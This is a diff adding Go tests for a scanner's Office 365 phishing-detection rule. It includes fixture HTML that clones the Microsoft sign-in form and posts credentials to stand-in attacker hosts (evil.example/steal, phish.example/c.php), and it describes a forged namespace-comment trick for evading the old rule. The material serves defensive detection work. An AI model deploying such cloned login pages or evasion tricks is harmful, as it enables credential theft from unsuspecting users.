@@ -288,6 +288,90 @@ $table_prefix = 'wp_';
 	}
 }
 
+// --- phishing_office365: DOM markers replace forgeable namespace exclude ---
+//
+// The old rule excluded any file containing `namespace <EasyWPSMTP|WPMailSMTP
+// |FluentMail>`. Because the match is not bound to PHP code, an attacker could
+// paste the token as an HTML comment and silence a Critical phishing alert.
+// The replacement keys on DOM IDs phishing kits copy verbatim from the real
+// login.microsoftonline.com page (i0116, i0118, idSIButton9, urlMsaSignUp /
+// urlResetPasswordMsa). Legitimate SMTP plugin admin views do not mimic the
+// login DOM, so the exclude is no longer needed.
+
+func TestPhishingOffice365_ForgedNamespaceCommentCannotBypass(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	phish := []byte(`<!DOCTYPE html>
+<!-- namespace EasyWPSMTP -->
+<html>
+<head><title>Sign in to your Microsoft account</title></head>
+<body>
+<p>office365 login</p>
+<form action="https://evil.example/steal" method="post">
+  <input type="email" id="i0116" name="loginfmt">
+  <input type="password" id="i0118" name="passwd">
+  <input type="submit" id="idSIButton9" value="Sign in">
+</form>
+<script>var urlMsaSignUp = 'https://signup.live.com/';</script>
+</body>
+</html>
+`)
+	matches := scanner.ScanContent(phish, ".html")
+	if !hasRule(matches, "phishing_office365") {
+		t.Error("phishing_office365 must fire on MS-login DOM clone; forged namespace HTML comment must not bypass")
+	}
+}
+
+func TestPhishingOffice365_LegitSMTPPluginAdminViewDoesNotFire(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	// Mimics a FluentSMTP admin settings view: PHP namespace header, brand
+	// names in documentation, password input for the SMTP client secret.
+	// None of the real MS login DOM IDs appear, because the plugin does not
+	// clone the Microsoft login page.
+	legit := []byte(`<?php
+namespace FluentMail\App\Views\Settings;
+
+// Provider: Office 365 via Microsoft Graph.
+// See: https://login.microsoftonline.com/ for OAuth redirect configuration.
+?>
+<div class="fluentmail-settings">
+  <h2>Office 365 connection</h2>
+  <label>Client secret</label>
+  <input type="password" name="client_secret" class="regular-text">
+  <label>Tenant ID</label>
+  <input type="text" name="tenant_id">
+</div>
+`)
+	matches := scanner.ScanContent(legit, ".php")
+	if hasRule(matches, "phishing_office365") {
+		t.Error("phishing_office365 FP: matched FluentSMTP admin settings view (brand + password field, no MS login DOM)")
+	}
+}
+
+func TestPhishingOffice365_ClonedLoginPageDetected(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	// Phishing kit copies the real Microsoft login DOM verbatim.
+	phish := []byte(`<!DOCTYPE html>
+<html>
+<body>
+<p>Sign in to your office365 account</p>
+<form id="credentials" action="https://phish.example/c.php" method="post">
+  <input type="email" id="i0116" name="loginfmt" placeholder="Email">
+  <input type="password" id="i0118" name="passwd" placeholder="Password">
+  <input type="submit" id="idSIButton9" value="Sign in">
+</form>
+<script>
+  var urlMsaSignUp = "https://signup.live.com/signup";
+  var urlResetPasswordMsa = "https://account.live.com/password/reset";
+</script>
+</body>
+</html>
+`)
+	matches := scanner.ScanContent(phish, ".html")
+	if !hasRule(matches, "phishing_office365") {
+		t.Error("phishing_office365 regression: cloned MS login page must be detected")
+	}
+}
+
 // --- backdoor_php_auto_append: php_shield is not a .htaccess context ----
 
 func TestBackdoorPhpAutoAppend_PhpShieldTargetStillFires(t *testing.T) {
